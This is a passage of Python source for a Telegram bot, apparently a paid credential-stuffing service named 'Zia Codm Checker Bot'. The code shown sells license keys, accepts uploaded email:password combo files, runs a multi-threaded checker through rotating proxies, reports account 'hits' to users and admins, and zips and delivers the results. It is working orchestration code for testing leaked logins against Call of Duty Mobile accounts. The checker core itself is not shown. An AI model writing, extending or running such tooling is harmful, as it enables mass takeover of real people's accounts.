            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_NOTIFHIT:
        cfg5=load_config()
        cfg5["notify_admin_on_hit"] = not cfg5.get("notify_admin_on_hit", False)
        save_config(cfg5)
        status5="🔔 ON" if cfg5["notify_admin_on_hit"] else "🔕 OFF"
        await update.message.reply_text(
            f"{pe(3)} <b>Admin Hit Notifications: {status5}</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} {'Admin will receive a message for every CODM hit.' if cfg5['notify_admin_on_hit'] else 'Hit notifications to admin are now off.'}",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_USERSEARCH:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="usersearch"
        await update.message.reply_text(
            f"{pe(2)} <b>🔍 Search User</b>\n"
            f"{pe_sep()}\n"
            f"Send user ID or @username to look up:",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_KEYLIST:
        keys5=load_keys()
        if not keys5:
            await update.message.reply_text(f"{pe(1)} No keys.", parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return
        lines5=[f"{pe(5)} <b>📋 Key List</b> {pe(5)}\n{pe_sep()}"]
        for k5,kd5 in list(keys5.items())[:20]:
            used5=len(kd5.get("used_by",[])); max5=kd5.get("max_users",1)
            exp5=fmt_expiry(kd5.get("expires_at")); dt5=kd5.get("duration_type","?")
            lines5.append(f"{pe(1)} <code>{k5}</code>\n  {used5}/{max5} users  ·  {dt5}  ·  {exp5}")
        if len(keys5)>20: lines5.append(f"\n{pe(1)} <i>…and {len(keys5)-20} more</i>")
        await update.message.reply_text("\n".join(lines5), parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_BATCHKEY:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="batchkey"
        await update.message.reply_text(
            f"{pe(2)} <b>🔑 Batch Key Generation</b>\n"
            f"{pe_sep()}\n"
            f"Format: <code>type duration count max_users</code>\n\n"
            f"Examples:\n"
            f"  <code>days 30 5 1</code>  → 5 keys, 30 days, 1 user each\n"
            f"  <code>hours 24 10 2</code> → 10 keys, 24h, 2 users each\n"
            f"  <code>lifetime 0 3 1</code> → 3 lifetime keys",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_USERNOTE:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="usernote"
        await update.message.reply_text(
            f"{pe(2)} <b>📝 User Note</b>\n"
            f"{pe_sep()}\n"
            f"Format: <code>user_id your note here</code>\n\n"
            f"Example: <code>123456789 VIP customer, handle with care</code>",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text in (BTN_ADM_SET_LIMIT, BTN_ADM_SET_VLIMIT, BTN_ADM_SET_CD, BTN_ADM_SET_THR, BTN_ADM_SET_CONC):
        action_map2={BTN_ADM_SET_LIMIT:"setlimit",BTN_ADM_SET_VLIMIT:"setviplimit",BTN_ADM_SET_CD:"setcd",BTN_ADM_SET_THR:"setthreads",BTN_ADM_SET_CONC:"setconcurrent"}
        a2=action_map2[text]
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]=a2
        hints2={"setlimit":"Send a number (e.g. 5000) or <code>off</code>","setviplimit":"Send a number or <code>off</code>","setcd":"Send: <code>sessions minutes</code>  e.g. <code>3 30</code>  or <code>off</code>","setthreads":"Send thread count (e.g. 3)","setconcurrent":"Send concurrent slot count (e.g. 5)"}
        await update.message.reply_text(
            f"{pe(2)} <b>{text}</b>\n{pe_sep()}\n{pe(1)} {hints2[a2]}",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_RELOAD_CFG:
        cfg2=load_config()
        saved_mc=cfg2.get("max_concurrent",5)
        if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
        try:
            import dec_tyrantv12 as _dty2; _dty2.geo_rotator.__init__()
        except: pass
        await update.message.reply_text(f"{pe(3)} <b>Config Reloaded!</b>\n{pe_sep()}\nSettings refreshed.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return

    if text == BTN_ADM_FILES:
        cc=sum(1 for d in COMBO_DIR.iterdir() if d.is_dir() for _ in d.glob("*.txt")) if COMBO_DIR.exists() else 0
        cr=sum(1 for d in RESULTS_DIR.iterdir() if d.is_dir()) if RESULTS_DIR.exists() else 0
        await update.message.reply_text(
            f"{pe(2)} <b>Files Panel</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Combo Files   : <code>{cc}</code>\n"
            f"{pe(1)} Result Folders: <code>{cr}</code>\n"
            f"{pe_sep()}\n{pe(1)} Choose action:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_files()); return

    if text == BTN_ADM_CLR_COMBO:
        count8=0
        for uid_dir8 in list(COMBO_DIR.iterdir()) if COMBO_DIR.exists() else []:
            if uid_dir8.is_dir():
                for f8 in uid_dir8.glob("*.txt"):
                    try: f8.unlink(); count8+=1
                    except: pass
                uid8=uid_dir8.name; clear_persisted_session(uid8)
                with sessions_lock:
                    if uid8 in active_sessions and active_sessions[uid8].get("status") not in ("checking",):
                        del active_sessions[uid8]
                try:
                    if uid_dir8.exists() and not any(uid_dir8.iterdir()): uid_dir8.rmdir()
                except: pass
        await update.message.reply_text(
            f"{pe(2)} <b>Combo Cleared</b>\n{pe_sep()}\n{pe(1)} Deleted: <code>{count8}</code> file(s)",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_files()); return

    if text == BTN_ADM_CLR_RES:
        import shutil; dirs8=0
        for uid_dir8 in RESULTS_DIR.iterdir() if RESULTS_DIR.exists() else []:
            if uid_dir8.is_dir():
                try: shutil.rmtree(uid_dir8); dirs8+=1
                except: pass
        await update.message.reply_text(
            f"{pe(2)} <b>Results Cleared</b>\n{pe_sep()}\n{pe(1)} Deleted: <code>{dirs8}</code> folder(s)",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_files()); return

    if text == BTN_ADM_BROADCAST:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="broadcast"
        await update.message.reply_text(
            f"{pe(2)} <b>Broadcast</b>\n{pe_sep()}\nSend the message to broadcast to all users:",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return


async def _show_admin_panel(msg, cfg):
    """Send admin panel status + keyboard."""
    users=load_users()
    ac=sum(1 for u in users.values() if u.get("activated"))
    bc=sum(1 for u in users.values() if u.get("banned"))
    vc=sum(1 for u in users.values() if u.get("vip"))
    with sessions_lock:
        live=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
        queue5=len(_checker_queue)
    lock_s="🔒 LOCKED" if cfg.get("locked") else "🔓 Unlocked"
    maint_s="🔴 ON" if cfg.get("maintenance_mode") else "🟢 Off"
    ml5=cfg.get("max_lines_per_check")
    ann5="✅ Set" if cfg.get("announcement_text","").strip() else "None"
    uptime_s5=int(time.time()-_railway_start); h5,m5=uptime_s5//3600,(uptime_s5%3600)//60
    bot_name5=cfg.get("bot_name","Zia Codm Checker Bot")
    await msg.reply_text(
        f"{pe(5)} <b>Admin Panel — {bot_name5}</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Users      : <code>{len(users)}</code>  ✅{ac}  🚫{bc}  ⭐{vc} {pe(2)}\n"
        f"{pe(2)} Live       : <code>{live}/{MAX_CONCURRENT_CHECKERS}</code>  Queue: <code>{queue5}</code> {pe(2)}\n"
        f"{pe(1)} Lock       : {lock_s}\n"
        f"{pe(1)} Maintenance: {maint_s}\n"
        f"{pe(1)} Limit      : <code>{cfg.get('global_limit') or 'Unlimited'}</code>  VIP:<code>{cfg.get('vip_limit') or 'Unlimited'}</code>\n"
        f"{pe(1)} Max/Session: <code>{ml5 or 'Unlimited'}</code>\n"
        f"{pe(1)} Announce   : <code>{ann5}</code>\n"
        f"{pe(1)} Uptime     : <code>{h5}h {m5}m</code>\n"
        f"{pe_sep()}\n{pe(1)} Choose a section:",
        reply_markup=kb_admin_main(cfg), parse_mode=ParseMode.HTML)


async def _handle_admin_text_input(update, context, uid, tg, cfg, action, text):
    """Process admin text inputs (key generation, settings, etc.)"""
    with sessions_lock:
        if uid in active_sessions: active_sessions[uid].pop("awaiting_admin_input",None)

    if text.strip() == BTN_CANCEL:
        await _show_admin_panel(update.message, cfg); return

    # ── Key generation ─────────────────────────────────────────────────
    if action.startswith("genkey_"):
        dtype=action[7:]
        parts=text.strip().split()
        try:
            if dtype=="lifetime":
                mu=int(parts[0])
                dval=0
            else:
                dval=int(parts[0]); mu=int(parts[1]) if len(parts)>1 else 1
        except:
            await update.message.reply_text(f"{pe(1)} Invalid input. Use: <code>value max_users</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_keys()); return
        exp=compute_expiry(dtype,dval)
        import uuid as _uuid
        key=f"Zia-{_uuid.uuid4().hex[:8].upper()}-{_uuid.uuid4().hex[:4].upper()}"
        dd={"hours":f"{dval}h","days":f"{dval}d","months":f"{dval}mo","lifetime":"Lifetime"}[dtype]
        keys=load_keys()
        keys[key]={"max_users":mu,"used_by":[],"duration_type":dtype,"duration_val":dval,
                   "expires_at":exp,"created_at":datetime.now().isoformat(),"created_by":tg.id}
        save_keys(keys)
        await update.message.reply_text(
            f"{pe(5)} <b>KEY GENERATED!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"<code>{key}</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Duration  : <b>{dd}</b>\n"
            f"{pe(1)} Expires   : {fmt_expiry(exp)}\n"
            f"{pe(1)} Max Users : <code>{mu}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_keys()); return

    # ── User actions ───────────────────────────────────────────────────
    if action in ("addvip","rmvip","ban","unban"):
        try: target=text.strip()
        except: await update.message.reply_text(f"{pe(1)} Invalid ID.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_users()); return
        users=load_users()
        if target not in users:
            await update.message.reply_text(f"{pe(1)} User <code>{target}</code> not found.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_users()); return
        if action=="addvip":   users[target]["vip"]=True;  label="VIP Added"
        elif action=="rmvip":  users[target]["vip"]=False; label="VIP Removed"
        elif action=="ban":    users[target]["banned"]=True; label="User Banned"
        elif action=="unban":  users[target]["banned"]=False; label="User Unbanned"
        save_users(users)
        try: await context.bot.send_message(chat_id=int(target),text=f"{pe(2)} <b>Account Updated</b>\n{pe_sep()}\nYour account status was updated by admin.",parse_mode=ParseMode.HTML)
        except: pass
        await update.message.reply_text(
            f"{pe(2)} <b>{label}</b>\n{pe_sep()}\n{pe(1)} User: <code>{target}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_users()); return

    # ── Broadcast ──────────────────────────────────────────────────────
    if action=="broadcast":
        users=load_users(); sent=0; failed=0
        for uid2 in users:
            try:
                await context.bot.send_message(chat_id=int(uid2),
                    text=f"{pe(2)} <b>Announcement</b>\n{pe_sep()}\n{text}",
                    parse_mode=ParseMode.HTML)
                sent+=1
            except: failed+=1
        await update.message.reply_text(
            f"{pe(3)} <b>Broadcast Done</b>\n{pe_sep()}\n{pe(1)} Sent: <code>{sent}</code>  Failed: <code>{failed}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_main(cfg)); return

    # ── Settings ───────────────────────────────────────────────────────
    cfg2=load_config()
    if action=="setlimit":
        if text.strip().lower()=="off": cfg2["global_limit"]=None
        else:
            try: cfg2["global_limit"]=int(text.strip())
            except: await update.message.reply_text(f"{pe(1)} Invalid number.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        await update.message.reply_text(f"{pe(3)} <b>Limit Set</b>\n{pe_sep()}\n{pe(1)} Limit: <code>{cfg2['global_limit'] or 'Unlimited'}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
    if action=="setviplimit":
        if text.strip().lower()=="off": cfg2["vip_limit"]=None
        else:
            try: cfg2["vip_limit"]=int(text.strip())
            except: await update.message.reply_text(f"{pe(1)} Invalid number.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        await update.message.reply_text(f"{pe(3)} <b>VIP Limit Set</b>\n{pe_sep()}\n{pe(1)} VIP Limit: <code>{cfg2['vip_limit'] or 'Unlimited'}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
    if action=="setcd":
        if text.strip().lower()=="off": cfg2["cooldown_sessions"]=None; cfg2["cooldown_minutes"]=30
        else:
            p=text.strip().split()
            try: cfg2["cooldown_sessions"]=int(p[0]); cfg2["cooldown_minutes"]=int(p[1]) if len(p)>1 else 30
            except: await update.message.reply_text(f"{pe(1)} Invalid. Use: <code>sessions minutes</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        await update.message.reply_text(f"{pe(3)} <b>Cooldown Set</b>\n{pe_sep()}\n{pe(1)} After <code>{cfg2.get('cooldown_sessions')}</code> sessions, cooldown <code>{cfg2.get('cooldown_minutes')}m</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
    if action=="setthreads":
        try: cfg2["default_threads"]=max(1,int(text.strip()))
        except: await update.message.reply_text(f"{pe(1)} Invalid number.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        await update.message.reply_text(f"{pe(3)} <b>Threads Set</b>\n{pe_sep()}\n{pe(1)} Default threads: <code>{cfg2['default_threads']}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
    if action=="setconcurrent":
        try:
            n=max(1,min(50,int(text.strip())))
            cfg2["max_concurrent"]=n; save_config(cfg2); rebuild_semaphore(n)
        except: await update.message.reply_text(f"{pe(1)} Invalid number.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        await update.message.reply_text(f"{pe(3)} <b>Concurrent Set</b>\n{pe_sep()}\n{pe(1)} Concurrent slots: <code>{n}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return

    if action=="setmlimit":
        if text.strip().lower() in ("off","0","none"): cfg2["max_lines_per_check"]=None
        else:
            try: cfg2["max_lines_per_check"]=max(1,int(text.strip()))
            except: await update.message.reply_text(f"{pe(1)} Invalid number. Send a number or <code>off</code>.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return
        save_config(cfg2)
        val=cfg2.get("max_lines_per_check")
        await update.message.reply_text(f"{pe(3)} <b>Max Lines/Check Set</b>\n{pe_sep()}\n{pe(2)} Max lines per session: <code>{val or 'Unlimited'}</code> {pe(2)}",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return

    if action=="set_announcement":
        if text.strip().lower()=="off": cfg2["announcement_text"]=""
        else: cfg2["announcement_text"]=text.strip()
        save_config(cfg2)
        val=cfg2.get("announcement_text","")
        await update.message.reply_text(
            f"{pe(3)} <b>Announcement {'Cleared' if not val else 'Set'}</b>\n{pe_sep()}\n"
            f"{pe(1)} {val or 'No announcement set.'}",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if action=="batchkey":
        parts=text.strip().split()
        try:
            dtype=parts[0]; dval=int(parts[1]); count=min(int(parts[2]),50); mu=int(parts[3]) if len(parts)>3 else 1
        except:
            await update.message.reply_text(f"{pe(1)} Invalid format. Use: <code>type duration count max_users</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        if dtype not in ("hours","days","months","lifetime"):
            await update.message.reply_text(f"{pe(1)} type must be hours/days/months/lifetime",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        import uuid as _uuid2
        exp=compute_expiry(dtype,dval); keys=load_keys(); generated=[]
        dd={"hours":f"{dval}h","days":f"{dval}d","months":f"{dval}mo","lifetime":"Lifetime"}[dtype]
        for _ in range(count):
            k=f"Zia-{_uuid2.uuid4().hex[:8].upper()}-{_uuid2.uuid4().hex[:4].upper()}"
            keys[k]={"max_users":mu,"used_by":[],"duration_type":dtype,"duration_val":dval,
                     "expires_at":exp,"created_at":datetime.now().isoformat(),"created_by":tg.id}
            generated.append(k)
        save_keys(keys)
        key_lines="\n".join(f"<code>{k}</code>" for k in generated)
        await update.message.reply_text(
            f"{pe(5)} <b>🔑 {count} Keys Generated!</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Duration  : <b>{dd}</b>\n"
            f"{pe(1)} Max Users : <code>{mu}</code> each\n"
            f"{pe_sep()}\n"
            f"{key_lines}",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if action=="usernote":
        parts=text.strip().split(None,1)
        if len(parts)<2:
            await update.message.reply_text(f"{pe(1)} Format: <code>user_id note text</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        target_n=parts[0]; note_n=parts[1]
        users_n=load_users()
        if target_n not in users_n:
            await update.message.reply_text(f"{pe(1)} User <code>{target_n}</code> not found.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        users_n[target_n]["note"]=note_n; save_users(users_n)
        await update.message.reply_text(
            f"{pe(3)} <b>Note Saved</b>\n{pe_sep()}\n"
            f"{pe(1)} User : <code>{target_n}</code>\n{pe(1)} Note : <i>{note_n}</i>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if action=="usersearch":
        q=text.strip().lstrip("@"); users_s=load_users(); found=[]
        for uid_s,ud_s in users_s.items():
            if q==uid_s or q.lower()==ud_s.get("username","").lower() or q.lower() in ud_s.get("first_name","").lower():
                found.append((uid_s,ud_s))
        if not found:
            await update.message.reply_text(f"{pe(1)} No user found for <code>{q}</code>.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_den()); return
        lines_s=[f"{pe(5)} <b>🔍 Search Results</b> {pe(5)}\n{pe_sep()}"]
        for uid_s,ud_s in found[:5]:
            fn_s=ud_s.get("first_name","?"); un_s=ud_s.get("username","?")
            act_s="✅" if ud_s.get("activated") else "❌"; vip_s="⭐" if ud_s.get("vip") else ""; ban_s="🚫" if ud_s.get("banned") else ""
            exp_s2=fmt_expiry(ud_s.get("key_expires_at")); note_s2=ud_s.get("note","")
            cl_s=ud_s.get("custom_limit"); cd_s2=cfg2.get("cooldown_sessions")
            lines_s.append(
                f"{pe(1)} <b>{fn_s}</b> @{un_s} {act_s}{vip_s}{ban_s}\n"
                f"    ID: <code>{uid_s}</code>\n"
                f"    Checked: <code>{ud_s.get('total_checked',0):,}</code>  Sessions: <code>{ud_s.get('sessions_count',0)}</code>\n"
                f"    Expiry: {exp_s2}  Limit: {cl_s or 'default'}\n"
                + (f"    Note: <i>{note_s2}</i>\n" if note_s2 else "")
            )
        await update.message.reply_text("\n".join(lines_s), parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if action=="del_proxy_select":
        fname=text.strip()
        if fname.upper()=="ALL":
            import shutil
            for pf in list(PROXY_DIR.glob("*.txt")):
                try: pf.unlink()
                except: pass
            try:
                import dec_tyrantv12 as _dty2; _dty2.geo_rotator.__init__()
            except: pass
            await update.message.reply_text(f"{pe(2)} <b>All Proxy Files Deleted</b>\n{pe_sep()}\nProxy rotator reset.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return
        fp=PROXY_DIR/fname
        if not fp.exists():
            await update.message.reply_text(f"{pe(1)} File <code>{fname}</code> not found.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return
        fp.unlink()
        try:
            import dec_tyrantv12 as _dty2; _dty2.geo_rotator.__init__()
        except: pass
        await update.message.reply_text(f"{pe(2)} <b>Proxy File Deleted</b>\n{pe_sep()}\n{pe(1)} Deleted: <code>{fname}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return

    # fallback
    await _show_admin_panel(update.message, cfg)


async def _handle_proxy_line_check(update, context, uid, fname, line_num):
    """Check a specific proxy line number."""
    fpath=PROXY_DIR/fname
    with sessions_lock:
        if uid in active_sessions: active_sessions[uid].pop("awaiting_proxy_line",None)
    if not fpath.exists():
        await update.message.reply_text(f"{pe(1)} File not found: <code>{fname}</code>",parse_mode=ParseMode.HTML); return
    with open(fpath,"r",encoding="utf-8",errors="ignore") as f:
        lines=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
    if line_num<1 or line_num>len(lines):
        await update.message.reply_text(f"{pe(1)} Line {line_num} out of range (1-{len(lines)}).",parse_mode=ParseMode.HTML); return
    proxy_line=lines[line_num-1]
    await update.message.reply_text(f"{pe(1)} Checking proxy line {line_num}...",parse_mode=ParseMode.HTML)
    loop=asyncio.get_event_loop()
    ok,err=await loop.run_in_executor(None,_test_proxy_sync,proxy_line)
    status="Working" if ok else f"Dead ({err})"
    await update.message.reply_text(
        f"{pe(2)} <b>Proxy Check Result</b>\n"
        f"{pe_sep()}\n"
        f"{pe(1)} File   : <code>{fname}</code>\n"
        f"{pe(1)} Line   : <code>{line_num}</code>\n"
        f"{pe(1)} Proxy  : <code>{proxy_line[:60]}</code>\n"
        f"{pe(1)} Status : <b>{status}</b>",
        parse_mode=ParseMode.HTML, reply_markup=kb_admin_proxy())


async def _do_start_check_logic(update, context, uid, cfg, ud):
    """Handle the START CHECKING NOW button — launches checker if file is ready."""
    tg=update.effective_user; main_kb=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user()
    with sessions_lock: s=active_sessions.get(uid,{})
    st=s.get("status","")

    if st=="checking":
        await update.message.reply_text(
            f"{pe(2)} <b>Already Checking!</b>\n{pe_sep()}\n"
            f"{pe(1)} /check for live stats",
            parse_mode=ParseMode.HTML, reply_markup=main_kb); return

    # Check for existing file
    uc=COMBO_DIR/uid
    existing=list(uc.glob("*.txt")) if uc.exists() else []
    has_file=(s.get("file") and Path(s.get("file","")).exists()) or bool(existing)

    if not has_file:
        with sessions_lock: active_sessions.setdefault(uid,{})["status"]="waiting_file"
        await update.message.reply_text(
            f"{pe(5)} <b>Upload Your Combo File</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Send a <code>.txt</code> file with accounts. {pe(2)}\n"
            f"{pe(1)} Format: <code>email:password</code> per line.\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Tap Cancel to go back. {pe(2)}",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    # File is ready — check cooldown
    on_cd,ml=check_cooldown(uid,cfg)
    if on_cd and not is_admin(tg.id,cfg):
        h,m_=int(ml//60),int(ml%60)
        ts_="{}h {}m".format(h,m_) if h else "{}m".format(m_)
        await update.message.reply_text(
            f"{pe(2)} <b>Cooldown Active</b>\n{pe_sep()}\n"
            f"{pe(1)} Wait <b>{ts_}</b> before starting again.",
            parse_mode=ParseMode.HTML, reply_markup=main_kb); return

    # All good — launch the checker
    lk=s.get("lvl_key","lvl_all"); ck=s.get("cf_key","cf_both")
    thr_val=LEVEL_OPTIONS[lk]["threshold"]; clf=CLEAN_OPTIONS[ck]["filter"]
    ll=LEVEL_OPTIONS[lk]["label"]; cl=CLEAN_OPTIONS[ck]["label"]
    cid=update.effective_chat.id
    combo=Path(s.get("file","") or (existing[0] if existing else ""))
    if not combo.exists():
        await update.message.reply_text(f"{pe(1)} File not found. Please upload again.", parse_mode=ParseMode.HTML, reply_markup=main_kb); return

    stop_ev=s.get("stop_event",threading.Event())
    cfg2=load_config()
    udb=load_users(); isv=udb.get(uid,{}).get("vip",False) or is_admin(tg.id,cfg2)
    lim=cfg2.get("vip_limit") if isv else cfg2.get("global_limit")
    threads=cfg2.get("default_threads",5)
    _hits_on=udb.get(uid,{}).get("hits_notif",False)
    btok=cfg2["bot_token"] if _hits_on else None
    try:
        with open(combo,"r",encoding="utf-8",errors="ignore") as f:
            total_lines=sum(1 for ln in f if ln.strip() and ":" in ln)
    except: total_lines=0
    disp=min(lim,total_lines) if lim else total_lines
    ts_stamp=datetime.now().strftime("%Y%m%d_%H%M%S")
    rf=RESULTS_DIR/uid/ts_stamp; rf.mkdir(parents=True,exist_ok=True)

    with sessions_lock:
        active_sessions[uid]["status"]="checking"
        active_sessions[uid]["result_folder"]=str(rf)
        active_sessions[uid]["orig_total"]=disp

    _hits_label=f"Hits notifications: ON" if _hits_on else "Hits notifications: OFF"
    smsg=await update.message.reply_text(
        f"{pe(5)} <b>CHECKER STARTED!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Lines   : <code>{disp:,}</code> {pe(2)}\n"
        f"{pe(1)} Threads : <code>{threads}</code> {pe(1)}\n"
        f"{pe(2)} Level   : <b>{ll}</b> {pe(2)}\n"
        f"{pe(2)} Filter  : <b>{cl}</b> {pe(2)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} {_hits_label} {pe(1)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} /check for stats  |  /stop to stop {pe(3)}",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)
    if smsg: track(uid,smsg.message_id)

    persist_session(uid,{
        "file":str(combo),"chat_id":cid,
        "lvl_key":lk,"cf_key":ck,
        "status_msg_id":smsg.message_id if smsg else None,
        "username":tg.username or "","first_name":tg.first_name or "",
        "status":"checking","result_folder":str(rf),"orig_total":disp,
    })

    loop=asyncio.get_event_loop()
    _status_stop=threading.Event()
    _auto_part=[1]

    def _status_loop():
        while not _status_stop.wait(180):
            with sessions_lock: s2=active_sessions.get(uid,{})
            if s2.get("status")!="checking": break
            ls2=s2.get("live_stats")
            if ls2 is not None:
                cur_stats=ls2.get_stats()
                update_persisted_stats(uid,cur_stats)
                done_count=cur_stats.get("total",0)
                if disp and done_count>disp: done_count=disp
                card=stats_card(done_count,disp,cur_stats,ll,cl,result_folder=str(rf))
                try:
                    asyncio.run_coroutine_threadsafe(
                        context.bot.edit_message_text(chat_id=cid,message_id=smsg.message_id,text=card,parse_mode=ParseMode.HTML),loop)
                except: pass
            try:
                cur_rf=Path(s2.get("result_folder",str(rf)))
                result_files=[f for f in cur_rf.rglob("*") if f.is_file() and not f.name.endswith(".zip")]
                folder_size=sum(f.stat().st_size for f in result_files)
                if folder_size>=int(TG_MAX_BYTES*0.85):
                    pzip=cur_rf/f"results_{uid}_{ts_stamp}_auto{_auto_part[0]}.zip"
                    with zipfile.ZipFile(pzip,"w",zipfile.ZIP_DEFLATED) as zf:
                        for f in result_files: zf.write(f,f.relative_to(cur_rf))
                    ls3=s2.get("live_stats"); snap=ls3.get_stats() if ls3 else {}
                    asyncio.run_coroutine_threadsafe(
                        deliver_results(context.bot,cid,uid,[pzip],snap,combo_file=None,partial=True),loop)
                    for f in result_files:
                        try: f.unlink()
                        except: pass
                    _auto_part[0]+=1
            except: pass
    threading.Thread(target=_status_loop,daemon=True,name=f"status-{uid}").start()

    def bg():
        _enqueue(uid); pos=_queue_pos(uid)
        if pos>1:
            asyncio.run_coroutine_threadsafe(context.bot.send_message(chat_id=cid,
                text=f"{pe(3)} <b>Queue Position: #{pos}</b> {pe(3)}\n{pe_sep()}\n{pe(2)} Waiting for a free slot. /stop to cancel. {pe(2)}",
                parse_mode=ParseMode.HTML),loop)
        _checker_semaphore.acquire(); _dequeue(uid)
        with sessions_lock:
            if active_sessions.get(uid,{}).get("status")!="checking" or stop_ev.is_set():
                _checker_semaphore.release(); _status_stop.set(); return
        try:
            asyncio.run_coroutine_threadsafe(context.bot.edit_message_text(
                chat_id=cid,message_id=smsg.message_id,
                text=(f"{pe(5)} <b>CHECKER RUNNING!</b> {pe(5)}\n"
                      f"{pe_sep()}\n"
                      f"{pe(2)} Lines   : <code>{disp:,}</code> {pe(2)}\n"
                      f"{pe(1)} Threads : <code>{threads}</code> {pe(1)}\n"
                      f"{pe(2)} Level   : <b>{ll}</b> {pe(2)}\n"
                      f"{pe(2)} Filter  : <b>{cl}</b> {pe(2)}\n"
                      f"{pe_sep()}\n"
                      f"{pe(3)} /check for live stats {pe(3)}\n"
                      f"{pe(1)} /stop to stop {pe(1)}"),
                parse_mode=ParseMode.HTML),loop)
        except: pass
        try:
            if not CHECKER_OK:
                asyncio.run_coroutine_threadsafe(context.bot.send_message(
                    chat_id=cid,
                    text=(f"{pe(2)} <b>Checker Unavailable</b>\n{pe_sep()}\n"
                          f"The checker module failed to load.\n<code>{CHECKER_ERR[:300]}</code>\n\nContact admin."),
                    parse_mode=ParseMode.HTML),loop); return
            st_res=run_checker(uid,combo,rf,lim,threads,stop_ev,btok,cid,thr_val,clf)
            if st_res.get("error"):
                asyncio.run_coroutine_threadsafe(context.bot.send_message(
                    chat_id=cid,
                    text=f"{pe(2)} <b>Checker Error</b>\n{pe_sep()}\n<code>{st_res['error'][:400]}</code>",
                    parse_mode=ParseMode.HTML),loop); return
            u2=load_users()
            if uid in u2:
                u2[uid]["total_checked"]+=st_res.get("total",0)
                u2[uid]["sessions_count"]+=1; save_users(u2)
            zo=rf/f"results_{uid}_{ts_stamp}.zip"; zp=zip_results(rf,zo)
            with sessions_lock: s2=active_sessions.get(uid,{})
            is_continuing=s2.get("stop_continue",False)
            if is_continuing:
                asyncio.run_coroutine_threadsafe(
                    deliver_results(context.bot,cid,uid,zp,st_res,combo_file=None,partial=True),loop)
                new_stop=threading.Event()
                with sessions_lock:
                    if uid in active_sessions:
                        active_sessions[uid]["stop_event"]=new_stop
                        active_sessions[uid]["stop_continue"]=False
                        active_sessions[uid]["status"]="checking"
                _checker_semaphore.release(); _status_stop.set()
                new_ts=datetime.now().strftime("%Y%m%d_%H%M%S")
